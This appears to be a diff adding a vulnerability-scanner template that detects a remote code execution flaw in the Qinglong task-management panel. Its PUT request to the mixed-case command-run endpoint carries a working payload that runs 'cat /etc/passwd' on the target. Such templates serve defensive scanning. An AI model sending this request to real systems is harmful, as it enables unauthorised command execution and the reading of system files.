@@ -1,0 +1,37 @@
+id: qinglong-command-run-rce
+info:
+  name: Qinglong Command Run RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Remote Code Execution vulnerability in Qinglong Scheduled Task Management Panel through command-run.
+
+http:
+  - raw:
+      - |
+        PUT /aPi/system/command-run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command": "cat /etc/passwd"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "开始执行"
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
